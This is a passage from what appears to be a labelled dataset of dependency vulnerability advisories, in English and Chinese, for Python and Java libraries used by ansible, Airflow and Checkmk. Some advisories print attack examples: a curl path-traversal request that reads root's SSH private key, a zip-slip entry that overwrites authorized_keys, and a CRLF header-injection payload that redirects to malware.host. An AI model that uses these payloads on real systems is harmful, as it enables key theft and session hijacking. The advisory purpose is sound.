Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 0.9.1 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#091---2015-06-06)
- [Github PR](https://github.com/pyca/cryptography/pull/2013)
- [Gtihub Commit](https://github.com/pyca/cryptography/commit/87c99a503a699f5c0296636237a9208fc161cc9e)
",2,2
ansible_ansible,cryptography,#typestubsnotpublishedseparately,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

The OpenSSL backend beffore 1.0.2 made use of assertions to check response where the tests could not trigger a failure. If a user ran Python with this -O flag and got an invalid response code this could lead to a crash.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 1.0.2 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#102---2015-09-27)
- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=1267548)
",3,2
ansible_ansible,cryptography,#typestubsnotpublishedseparately,True,,CWE-222,2015-09-10,"## Overview
[`cryptography`](https://pypi.python.org/pypi/cryptography) provides cryptographic recipes and primitives to Python developers.

Affected versions of this package are vulnerable to TLS Truncation. A malicious user can prevent a user from fetching the parts of a message by inserting TCP code into a message indicating the message has completed.

## References
- [GitHub PR](https://github.com/pyca/cryptography/pull/2334)
- [GitHub Commit](https://github.com/pyca/cryptography/commit/41aabcbd2326ae154a16a1a050ee01fb9a54bd19)
",3,2
ansible_ansible,cryptography,#typestubsnotpublishedseparately,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
ansible_ansible,cryptography,#typestubsnotpublishedseparately,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
ansible_ansible,cryptography,#typestubsnotpublishedseparately,True,CVE-2022-3996,CWE-667,2022-12-13,OpenSSL是一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库，支持多种加密算法。如果X.509证书包含格式错误的策略约束并且启用了策略处理，系统将递归地获取两次写锁，导致在某些操作系统上进程挂起，进而造成拒绝服务。,2,2
ansible_ansible,cryptography,#typestubsnotpublishedseparately,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
ansible_ansible,cryptography,#typestubsnotpublishedseparately,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
ansible_ansible,cryptography,#typestubsnotpublishedseparately,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
ansible_ansible,cryptography,#typestubsnotpublishedseparately,True,CVE-2024-4603,CWE-606 CWE-834,2024-05-16,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0 和 3.1 版本存在安全漏洞，该漏洞源于使用函数 EVP_PKEY_param_check()、EVP_PKEY_public_check() 检查 DSA 公钥或 DSA 参数检查的键或参数，可能会导致拒绝服务。",3,2
ansible_ansible,jinja2,#typestubsnotpublishedseparately,True,CVE-2014-0012,CWE-264,2014-01-18,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
Jinja2 2.7.2版本存在权限许可和访问控制问题漏洞，该漏洞源于程序没有正确创建临时目录。本地攻击者可通利用该漏洞以用户的UID提前创建临时目录，获取特权。",3,0
ansible_ansible,jinja2,#typestubsnotpublishedseparately,True,CVE-2020-28493,CWE-400,2021-02-01,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
jinja2 from 0.0.0 and before 2.11.3 存在资源管理错误漏洞，该漏洞源于regex的ReDOS漏洞。",3,2
ansible_ansible,jinja2,#typestubsnotpublishedseparately,True,CVE-2016-10745,CWE-134,2019-04-08,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja中存在格式化字符串错误漏洞。该漏洞源于网络系统或产品接收外部格式化字符串作为参数时，对参数类型、数量等过滤不严格。以下产品及版本受到影响：Pallets Jinja 2.8.1之前版本。",2,2
ansible_ansible,jinja2,#typestubsnotpublishedseparately,True,CVE-2019-10906,CWE-693,2019-04-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 2.10.1之前版本中存在权限许可和访问控制问题漏洞。攻击者可利用该漏洞绕过沙盒保护。",2,2
ansible_ansible,jinja2,#typestubsnotpublishedseparately,True,CVE-2024-22195,CWE-79,2024-01-11,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Jinja 3.1.3之前版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。",3,0
ansible_ansible,jinja2,#typestubsnotpublishedseparately,True,CVE-2014-1402,CWE-264,2014-01-10,"Jinja2是一个基于Python的模板引擎，它拥有完整的unicode支持，并且提供了可选的沙箱模板执行环境来保证安全。
Jinja2 2.7.1及之前版本的bccache.FileSystemBytecodeCache中的默认配置存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可借助/tmp目录下特制的cache文件利用该漏洞获取特权。",2,0
ansible_ansible,jinja2,#typestubsnotpublishedseparately,True,CVE-2024-34064,CWE-79,2024-05-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 3.1.4之前版本存在安全漏洞，该漏洞源于将用户输入作为键传递给 xmlattr 过滤器时，Jinja 容易受到 HTML 属性注入。",3,0
ansible_ansible,jinja2,#typestubsnotpublishedseparately,True,CVE-2024-56326,CWE-693 CWE-1336,2024-12-23,Jinja 是由 Pallets 开源的一个快速、富有表现力并可扩展的模板引擎。该漏洞存在于 Jinja 版本 3.1.5 之前，由于在沙箱环境中对 str.format 调用的检测存在不当，攻击者可以控制模板的内容并执行任意 Python 代码。攻击者可以通过创建包含恶意字符串的模板并利用自定义过滤器实现攻击，这可能导致系统安全性严重受损。,3,0
ansible_ansible,jinja2,#typestubsnotpublishedseparately,True,CVE-2024-56201,CWE-150,2024-12-23,Jinja是Pallets开源的一个快速、富有表现力且可扩展的模板引擎。版本3.1.5之前的Jinja存在安全漏洞，该漏洞源于编译器的一个错误，允许同时控制模板内容和文件名的攻击者执行任意Python代码，无论Jinja的沙箱是否被使用。当应用程序执行不可信的模板时，攻击者需要能够控制模板的文件名和内容，才能有效利用此漏洞。,3,0
ansible_ansible,jinja2,#typestubsnotpublishedseparately,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
ansible_ansible,passlib,,True,,CWE-521,2020-05-19,"## Overview

Affected versions of this package are vulnerable to Cryptographic Weakness. The `SHA-256` prehash is unsalted, meaning the resulting `bcrypt` digest is vulnerable to breach correlation attacks.
## Remediation
Upgrade `passlib` to version 1.7.3 or higher.
## References
- [1.7.3 Release Changelog](https://passlib.readthedocs.io/en/stable/history/1.7.html#id1)
- [BitBucket Commit](https://bitbucket.org/ecollins/passlib/commits/bd0da1bdf0fd17b886212649184f2ce3eb8c8329)
- [BitBucket Issue](https://bitbucket.org/ecollins/passlib/issues/114/bcrypt_sha256-is-vulnerable-to-breach)
",3,0
ansible_ansible,passlib,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`passlib`](https://pypi.python.org/pypi/passlib) are vulnerable to Denial of Service (DoS) attack.

`passlib` is enable `wildcard password` by default, which allows remote attackers to cause a denial of service (CPU consumption) via multiple wildcard characters in the common name in a certificate.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `passlib` to version 1.4 or higher.

## References
- [Readthedocs Passlib ChangeLog](http://passlib.readthedocs.io/en/stable/history/ancient.html#hashes)
- [BitBucket Commit](https://bitbucket.org/ecollins/passlib/commits/aca22d57fc1d110be722d71180185f411a3374b7?at=1.4)
",3,2
apache_airflow,lxml,,True,CVE-2022-2309,CWE-476,2022-07-05,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。libxml2是开源的一个用来解析XML文档的函数库。它用C语言写成，并且能为多种语言所调用，例如C语言，C++，XSH。
lxml和libxml2 2.9.10版本至2.9.14版本存在代码问题漏洞。攻击者利用该漏洞通过伪造的输入数据触发崩溃。",3,2
apache_airflow,lxml,,True,CVE-2014-3146,CWE-79,2014-04-15,"lxml是一个使用Python语言编写的用于处理XML和HTML的库。
lxml 3.3.4及之前版本的lxml.html.clean模块中存在不完整黑名单漏洞，该漏洞源于程序没有正确过滤link scheme中的控制字符。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,1
apache_airflow,lxml,,True,CVE-2021-28957,CWE-79,2021-03-21,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.2 存在跨站脚本漏洞，该漏洞源于HTML5的formaction属性。",3,0
apache_airflow,lxml,,True,,CWE-22,2020-12-02,"## Overview

Affected versions of this package are vulnerable to Arbitrary File Write. When writing to file paths that contain the URL escape character '%', the file path could wrongly be mangled by URL unescaping and thus write to a different file or directory.
## Remediation
Upgrade `lxml` to version 4.4.0 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/0245aba002f069a0b157282707bdf77418d1b5be)
",3,0
apache_airflow,lxml,,True,CVE-2020-27783,CWE-79,2020-11-27,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
Lxml 存在跨站脚本漏洞，该漏洞源于javascript通过noscript和style组合进行转义。以下产品及版本会受到影响：Debian stretch, Debian stretch (security), Debian buster, Debian bullseye, sid; Red Hat Software Collections, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 5, Red Hat Enterprise Linux 6, Red Hat Enterprise Linux 7,Red Hat Enterprise Linux 8 , Red Hat OpenStack Platform 10 (Newton), Red Hat OpenStack Platform 13 (Queens)",3,0
apache_airflow,lxml,,True,CVE-2018-19787,CWE-79,2018-12-02,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.2.5之前版本中存在跨站脚本漏洞，该漏洞源于lxml.html.clean模块的lxml/html/clean.py文件没有移除使用转义的javascript: URLs。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,0
apache_airflow,lxml,,True,CVE-2021-43818,CWE-74 CWE-79,2021-12-13,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.5之前版本存在注入漏洞，该漏洞源于HTML Cleaner允许某些精心制作的脚本内容以及使用数据URI嵌入的SVG文件中的脚本内容通过。",3,0
apache_airflow,lxml,,True,,CWE-400,2024-01-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to race conditions when errors or user messages occur during threaded XSLT processing.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `lxml` to version 2.3.4 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/26ae51c60462ba1567a123bc9701ff18f9c10789)
",4,0
apache_airflow,commons-lang3,3.14.0,False,CVE-2025-48924,CWE-674,2025-07-11,Apache Commons Lang 是一个用于提供对 Java 基础类操作的通用工具库。该库中的 ClassUtils.getClass(...) 方法在处理非常长的输入时会因递归调用过深导致 StackOverflowError。递归深度没有得到有效控制，可能导致系统堆栈溢出，这是由于输入深度未被正确限制。目前影响版本包括从 commons-lang:commons-lang 2.0 到 2.6，以及 org.apache.commons:commons-lang3 3.0 到 3.18.0 之前的版本。此错误通常不被应用程序和库捕获处理，从而可能导致应用程序停止服务。,2,2
apache_airflow,wire-runtime,4.8.0,False,CVE-2024-58103,CWE-674,2025-03-16,Square Wire 是一个用于处理 Protocol Buffers 的库，提供了便捷的数据序列化和反序列化功能。该漏洞出现在 5.2.0 之前的版本中，原因是未对嵌套组在 ByteArrayProtoReader32.kt 和 ProtoReader.kt 文件中强制执行递归限制。这意味着攻击者可以利用此漏洞进行递归调用，导致栈溢出。攻击者可以构造特定的输入，从而引发栈溢出，并导致应用程序崩溃。,3,2
apache_airflow,okio,3.0.0,False,CVE-2023-3635,CWE-195 CWE-681,2023-07-12,Okio是一个现代化的 I/O 库，由 Square 开发，主要用于在 Java 应用程序中进行高效的读写操作。该库在处理 GZIP 文件时，GzipSource 类在解析畸形 GZIP 缓冲区时没有正确处理异常，导致系统可能发生拒绝服务。,3,0
apache_airflow,kaml,0.20.0,False,CVE-2021-39194,CWE-835,2021-09-07,kaml 是一个支持 Kotlin 序列化的 YAML 解析库。该库在处理特定 YAML 输入时存在一个无限循环漏洞。此漏洞存在于 0.35.3 之前的版本中，影响使用 tagged 多态序列化的应用程序，而使用 property 多态序列化的应用程序不受影响。该问题的根本原因在于 kaml 处理 YAML 输入中的多态类型时，如果提供了一个没有关联值的标签（例如 !<x>），应用程序会在解析时陷入无限循环。,3,0
apache_airflow,kaml,0.20.0,False,CVE-2023-28118,CWE-776,2023-03-20,Kaml库是一个为Kotlin序列化（`kotlinx.serialization`）提供YAML支持的库。该漏洞主要影响0.53.0版本之前的版本。当库解析包含锚点和引用的未受信任的YAML输入时，会导致过度的内存消耗，从而导致崩溃和拒绝服务（DoS）。其根本原因在于库未能恰当地处理YAML文件中的递归锚点和引用，使攻击者能够通过引入深度嵌套的结构来利用这一漏洞。,2,0
apache_airflow,netty-codec-http2,4.1.110.Final,False,CVE-2025-55163,CWE-770,2025-08-13,"Netty是Netty社区的一款非阻塞I/O客户端-服务器框架，它主要用于开发Java网络应用程序，如协议服务器和客户端等。
Netty 4.1.124.Final和4.2.4.Final之前版本存在安全漏洞，该漏洞源于HTTP/2协议逻辑缺陷，可能导致资源耗尽和分布式拒绝服务攻击。",2,2
apache_airflow,netty-codec-http,4.1.110.Final,False,CVE-2025-58056,CWE-444,2025-09-03,Netty 是一个异步事件驱动的网络应用程序框架，主要用于开发可维护的高性能协议服务器和客户端。在版本 4.1.124.Final 和 4.2.0.Alpha3 至 4.2.4.Final 中，Netty 在解析 HTTP/1.1 消息的分块编码时存在缺陷：它错误地接受了单独的换行符 (LF) 作为块大小行的终止符，而不是严格要求的 CRLF（回车和换行符组合），这违反了 HTTP/1.1 标准。当 Netty 部署在某些解析 LF 不同的反向代理后端时，攻击者可以构造特定请求，使代理认为这是一个请求，但 Netty 会将其解析为两个请求，从而实现请求走私攻击。该缺陷已在版本 4.1.125.Final 和 4.2.5.Final 中修复。,4,2
apache_airflow,netty-handler,4.1.110.Final,False,CVE-2025-24970,CWE-20,2025-02-10,"Netty是Netty社区的一款非阻塞I/O客户端-服务器框架，它主要用于开发Java网络应用程序，如协议服务器和客户端等。
Netty 4.1.91.Final版本至4.1.118.Final之前版本存在输入验证错误漏洞，该漏洞源于SslHandler对特定恶意数据包的验证缺陷，导致原生崩溃。",2,2
apache_airflow,netty-common,4.1.110.Final,False,CVE-2024-47535,CWE-400,2024-11-12,Netty 是由 Netty 社区开发的高性能、异步事件驱动的 Java 网络应用框架，常用于创建协议服务器和客户端等网络应用。在 Netty 的 4.1.114 及之前的版本中，存在一个资源管理错误漏洞。此漏洞的根本原因在于框架未能安全地读取环境文件，可能导致环境变量中的敏感信息泄露，影响到应用程序的机密性。,3,0
apache_airflow,netty-common,4.1.110.Final,False,CVE-2025-25193,CWE-400,2025-02-10,"Netty是Netty社区的一款非阻塞I/O客户端-服务器框架，它主要用于开发Java网络应用程序，如协议服务器和客户端等。
Netty 4.1.118.Final及之前版本存在资源管理错误漏洞，该漏洞源于Windows环境下对不存在的大文件读取未正确处理，可能引发拒绝服务。",3,0
Checkmk_checkmk,aiohttp,,True,,CWE-444,2023-11-28,"### Summary
llhttp 8.1.1 is vulnerable to two request smuggling vulnerabilities.
Details have not been disclosed yet, so refer to llhttp for future information.
The issue is resolved by using llhttp 9+ (which is included in aiohttp 3.8.6+).",3,-2
Checkmk_checkmk,aiohttp,,True,CVE-2022-33124,CWE-404,2022-06-22,"aiohttp是一个开源的用于 asyncio 和 Python 的异步 HTTP 客户端/服务器框架。
aiohttp 存在安全漏洞，该漏洞源于aiohttp v3.8.1 包含可能导致拒绝服务 (DoS) 的无效 IPv6 URL。",3,0
Checkmk_checkmk,aiohttp,,True,CVE-2021-21330,CWE-601,2021-02-25,"aiohttp是一个开源的用于 asyncio 和 Python 的异步 HTTP 客户端/服务器框架。
aiohttp 3.7.4 之前版本存在输入验证错误漏洞，该漏洞源于一个开放的重定向漏洞。恶意制作的指向会将浏览器重定向到另一个网站。",4,0
Checkmk_checkmk,aiohttp,,True,,CWE-22,2015-05-28,"## Overview
[`aiohttp`](https://pypi.python.org/pypi/aiohttp) is a Async http client/server framework (asyncio)
Affected versions of this package are vulnerable to Directory Traversal attacks due gluing the base directory with the requested path with `os.path.join`. Only paths with `..` are rejected.

## Details
A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with ""dot-dot-slash (../)"" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
```
**Note** `%2e` is the URL encoded version of `.` (dot).

- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. 

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys
```


## References
- [GitHub Issue](https://github.com/aio-libs/aiohttp/issues/380)
- [GitHub PR](https://github.com/aio-libs/aiohttp/pull/383)
- [GitHub Commit](https://github.com/aio-libs/aiohttp/commit/d9fdf551aaa388a738febe5ce697c0b07f597e94)
- [GitHub History](https://github.com/aio-libs/aiohttp/blob/master/HISTORY.rst#0163-05-30-2015)
",3,2
Checkmk_checkmk,aiohttp,,True,,CWE-644,2021-11-27,"## Overview

Affected versions of this package are vulnerable to HTTP Header Injection since aiohttp simply concatenated headers without any validation. This allowed an attacker to inject arbitrary content into the headers, including CRLF characters.

### PoC
```
// For this code
import aiohttp.web
async def handler(req: aiohttp.web.Request):
    return aiohttp.web.Response(headers={
        'X-Debug-Param': req.query.get('param', ''),
    })
app = aiohttp.web.Application()
app.add_get('/', handler)
```
```
// Send the following requests to the webapp
/?param=%0d%0aLocation:%20https://malware.host/  # open redirect
/?param=%0d%0aSet-Cookie:%20...                  # set some cookie
/?param=%0d%0aContent-Length:%2040%0d%0a         # skip next headers
```
## Remediation
Upgrade `aiohttp` to version 3.8.0 or higher.
## References
- [GitHub Commit](https://github.com/aio-libs/aiohttp/commit/3cae27ac9232b5b86b8837a9f540b8fc574489a0)
- [GitHub Issue](https://github.com/aio-libs/aiohttp/issues/4818)
- [GitHub PR](https://github.com/aio-libs/aiohttp/pull/5452)
- [GitHub Release](https://github.com/aio-libs/aiohttp/releases/tag/v3.8.0)
",2,2
Checkmk_checkmk,aiohttp,,True,CVE-2024-23829,CWE-444,2024-01-29,"aiohttp是一个开源的用于 asyncio 和 Python 的异步 HTTP 客户端/服务器框架。
aiohttp 3.9.2之前版本存在环境问题漏洞，该漏洞源于HTTP 解析器对于分隔符处理过于宽松，有助于请求走私。",3,2
Checkmk_checkmk,aiohttp,,True,CVE-2023-49082,CWE-20 CWE-93,2023-11-28,"aiohttp是一个开源的用于 asyncio 和 Python 的异步 HTTP 客户端/服务器框架。
aiohttp 3.9.0之前版本存在注入漏洞，该漏洞源于不正确的验证使攻击者可以修改 HTTP 请求（例如插入新标头），甚至在攻击者控制 HTTP 方法的情况下可以创建新的 HTTP 请求。",3,2
Checkmk_checkmk,aiohttp,,True,CVE-2023-49081,CWE-20,2023-11-28,"aiohttp是一个开源的用于 asyncio 和 Python 的异步 HTTP 客户端/服务器框架。
aiohttp 3.9.0之前版本存在安全漏洞，该漏洞源于不正确的验证使攻击者可以修改HTTP 请求或在攻击者控制HTTP 版本的情况下创建新的HTTP 请求。",3,2
Checkmk_checkmk,aiohttp,,True,CVE-2023-47641,CWE-444,2023-11-14,"aiohttp是一个开源的用于 asyncio 和 Python 的异步 HTTP 客户端/服务器框架。
aiohttp 3.8.6之前版本存在安全漏洞，该漏洞源于C 和 Python 回退中对Content-Length与Transfer-Encoding的解释不一致，攻击者利用该漏洞可以绕过任何代理规则。",4,0
Checkmk_checkmk,aiohttp,,True,CVE-2023-47627,CWE-444,2023-11-14,"aiohttp是一个开源的用于 asyncio 和 Python 的异步 HTTP 客户端/服务器框架。
aiohttp 3.8.6之前版本存在安全漏洞，该漏洞源于 HTTP 解析器在标头解析方面存在许多问题，可能导致请求走私。",3,2
Checkmk_checkmk,aiohttp,,True,CVE-2023-37276,CWE-444,2023-07-19,"aiohttp是一个开源的用于 asyncio 和 Python 的异步 HTTP 客户端/服务器框架。
aiohttp v3.8.4及之前版本存在环境问题漏洞，该漏洞源于容易通过llhttp HTTP请求解析器进行HTTP请求走私。",3,2
Checkmk_checkmk,aiohttp,,True,,CWE-444,2023-11-28,"## Overview

Affected versions of this package are vulnerable to HTTP Request Smuggling due to a vulnerable dependency. An attacker can exploit request smuggling vulnerabilities.
## Remediation
Upgrade `aiohttp` to version 3.8.6 or higher.
## References
- [GitHub Commit](https://github.com/aio-libs/aiohttp/commit/1303350e834899ad1c7733effc716a1a46a4b817)
- [GitHub Commit](https://github.com/aio-libs/aiohttp/commit/996de2629ef6b4c2934a7c04dfd49d0950d4c43b)
- [GitHub Commit](https://github.com/aio-libs/aiohttp/commit/bcc416e533796d04fb8124ef1e7686b1f338767a)
",3,2
Checkmk_checkmk,aiohttp,,True,CVE-2024-27306,CWE-79 CWE-80,2024-04-18,"aiohttp是一个开源的用于 asyncio 和 Python 的异步 HTTP 客户端/服务器框架。
aiohttp 3.9.4之前版本存在跨站脚本漏洞，该漏洞源于使用web.static(..., show_index=True)时，生成的索引页不会转义文件名，导致服务器容易受到跨站脚本攻击。",3,0
Checkmk_checkmk,aiohttp,,True,CVE-2024-30251,CWE-835,2024-05-02,aiohttp 是一个用于 asyncio 和 Python 的异步 HTTP 客户端/服务器框架，提供了对异步编程的支持。该框架允许开发者构建高效的网络服务。在受影响的版本中，存在一个漏洞使得攻击者可以通过发送一个特制的 POST (multipart/form-data) 请求，导致 aiohttp 服务器进入无限循环状态。这会使服务器无法处理进一步的请求，从而导致拒绝服务（DoS）。,2,0
Checkmk_checkmk,aiohttp,,True,CVE-2024-42367,CWE-61,2024-08-09,<p>aiohttp 是基于 Python asyncio 的异步 HTTP 客户端/服务器框架。该漏洞影响 aiohttp 3.10.2 版本之前的版本。当 aiohttp 配置为提供包含压缩文件（如 .gz 或 .br 文件）的静态路由时，如果这些文件为符号链接，路径遍历保护机制可能会被绕过。默认情况下，aiohttp 会通过将请求的 URL 解析为绝对路径并检查该路径是否相对根目录。然而，在处理压缩文件变体时，该检查被忽略，符号链接会被自动跟随，导致可能的路径遍历攻击。</p>,3,0
Checkmk_checkmk,aiohttp,,True,CVE-2025-53643,CWE-444,2025-07-14,AIOHTTP是一个用于Python的异步HTTP客户端/服务器框架，适用于构建高效的网络应用程序。在此漏洞中，由于纯Python版本的AIOHTTP在解析HTTP请求的chunked trailer部分时存在问题，导致了HTTP请求走私的漏洞。HTTP请求走私是一种攻击技术，攻击者通过构造特定的请求使得服务器和中间设备（如代理、防火墙）对请求的理解不一致，从而可以绕过安全机制。,4,2
Checkmk_checkmk,aiohttp,,True,CVE-2024-52304,CWE-444,2024-11-18,aiohttp 是一个用于 asyncio 和 Python 的异步 HTTP 客户端/服务器框架。该框架在 3.10.11 及之前版本中，存在请求走私漏洞。漏洞的根本原因是 Python 解析器错误地解析了块扩展中的换行符。在特定条件下（安装了纯 Python 版本或启用了 `AIOHTTP_NO_EXTENSIONS`），攻击者可能利用此漏洞执行请求走私攻击。,3,2
Checkmk_checkmk,azure-storage-blob,,True,CVE-2022-30187,CWE-327,2022-07-12,"Microsoft Azure是美国微软（Microsoft）公司的一套开放的企业级云计算平台。
Microsoft Azure存在加密问题漏洞。以下产品和版本受到影响：Azure Storage Blobs client library for .NET,Azure Storage Queues client library for .NET,Azure Storage Blobs client library for Java,Azure Storage Queues client library for Python,Azure Storage Blobs client library for Python.",3,2
Checkmk_checkmk,boto3,,True,,CWE-200,2017-03-10,"## Overview
[`boto3`](https://pypi.python.org/pypi/boto3) is the AWS SDK for Python.

Affected versions of this package are vulnerable to Information Exposure due to logging all of the bytes uploaded when the logger is set to the `INFO` level.

## Remediation
Upgrade `boto3` to version 1.4.5 or higher.

## References
- [GitHub Issue](https://github.com/boto/boto3/issues/1017)
- [GitHub Commit](https://github.com/boto/boto3/commit/5a4396a4e0d1b337c081cb4095e5255da915198e)",4,0
Checkmk_checkmk,botocore,,True,,CWE-362,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Race Condition related to assuming a role for the first time.
## Remediation
Upgrade `botocore` to version 1.9.12 or higher.
## References
